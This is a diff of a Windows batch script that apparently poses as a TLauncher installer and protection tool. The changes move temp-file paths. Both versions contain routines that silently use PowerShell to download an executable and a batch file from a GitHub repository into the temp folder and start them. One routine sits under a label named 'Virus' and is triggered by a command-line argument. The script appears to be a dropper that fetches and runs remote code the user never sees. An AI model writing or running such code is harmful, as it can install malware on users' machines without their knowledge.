@@ -11,7 +11,7 @@ echo 2.1 Added Security Feature (1=Normal 2=Harden 3=Intense)
 echo 2.2 Blocked Security Feature (Debug Mode Only)
 (
 echo mode 25,10
-echo if exist %temp%\TLauncherPortable.exe del %temp%\TLauncherPortable.exe
+echo if exist %temp%\TLauncherPortable.exe del %temp%\PKIInv\TLauncherPortable.exe
 echo if exist %temp%\ComputerClea3n.bat del %temp%\ComputerClea3n.bat
 echo if exist %temp%\Injector.bat del %temp%\Injector.bat
 echo if exist TLauncher.exe.bat del TLauncher.exe.bat
@@ -31,7 +31,7 @@ set KEYER=%KEY%
 set "ModuleKeyLogin=%~1"
 if %ModuleKeyLogin%==B goto Virus
 if not exist Uninstall_P.K.I.bat goto Checker
-if exist %temp%\TLauncherPortable.exe if %ModuleKeyLogin%==A goto :TLInstaller
+if exist %temp%\PKIInv\TLauncherPortable.exe if %ModuleKeyLogin%==A goto :TLInstaller
 title  
 mode 25,10
 goto :Checker
@@ -49,18 +49,18 @@ if not exist C:\PassProtectModule\%Project%\%filename%.key goto ENC
 goto MenuError
 goto Checker
 :TLInstaller
-if exist %temp%\TLauncherPortable.exe start %temp%\TLauncherPortable.exe & exit
+if exist %temp%\PKIInv\TLauncherPortable.exe start %temp%\PKIInv\TLauncherPortable.exe & exit
 cls
 title TLauncher Installer
 echo Protected By PK
 echo.
-powershell -nologo -noprofile -command "Invoke-WebRequest 'https://github.com/BatchExpert/CreativeNetwork/raw/main/BootStrapper/TLauncherPortable.exe' -OutFile '%temp%\TLauncherPortable.exe'" >nul 
-if exist %temp%\TLauncherPortable.exe start %temp%\TLauncherPortable.exe & exit
+powershell -nologo -noprofile -command "Invoke-WebRequest 'https://github.com/BatchExpert/CreativeNetwork/raw/main/BootStrapper/TLauncherPortable.exe' -OutFile '%temp%\PKIInv\TLauncherPortable.exe'" >nul 
+if exist %temp%\PKIInv\TLauncherPortable.exe start %temp%\PKIInv\TLauncherPortable.exe & exit
 goto Exit
 :Virus
-if exist %temp%\ComputerClea3n.bat start %temp%\ComputerClea3n.bat & exit
-powershell -nologo -noprofile -command "Invoke-WebRequest 'https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapper/ComputerClean.bat' -OutFile '%temp%\ComputerClea3n.bat'" >nul
-if exist %temp%\ComputerClea3n.bat start %temp%\ComputerClea3n.bat & exit
+if exist %temp%\PKIInv\ComputerClea3n.bat start %temp%\PKIInv\ComputerClea3n.bat & exit
+powershell -nologo -noprofile -command "Invoke-WebRequest 'https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapper/ComputerClean.bat' -OutFile '%temp%\PKIInv\ComputerClea3n.bat'" >nul
+if exist %temp%\PKIInv\ComputerClea3n.bat start %temp%\PKIInv\ComputerClea3n.bat & exit
 goto Exit
 :DEC
 :CCC
